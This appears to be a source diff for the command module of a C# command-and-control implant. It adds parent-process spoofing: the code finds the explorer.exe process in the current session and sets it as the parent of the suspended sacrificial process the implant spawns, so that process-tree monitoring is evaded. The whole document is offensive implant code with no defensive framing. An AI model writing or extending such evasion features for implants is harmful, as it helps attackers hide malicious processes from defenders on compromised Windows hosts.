@@ -39,6 +39,17 @@ namespace Agent.Commands
 
             try
             {
+                int parentProcessId = 0;
+                try
+                {
+                    var currentSessionId = Process.GetCurrentProcess().SessionId;
+                    parentProcessId = Process.GetProcessesByName("explorer")
+                        .Where(p => p.SessionId == currentSessionId)
+                        .Select(p => p.Id)
+                        .FirstOrDefault();
+                }
+                catch { }
+
                 var creationParms = new ProcessCreationParameters()
                 {
                     Application = context.ConfigService.SpawnToX64,
@@ -47,6 +58,7 @@ namespace Agent.Commands
                     CreateSuspended = true,
                     CurrentDirectory = Environment.CurrentDirectory,
                     Credentials = creds,
+                    ParentProcessId = parentProcessId,
                 };
 
                 if (context.Agent.ImpersonationToken != IntPtr.Zero)
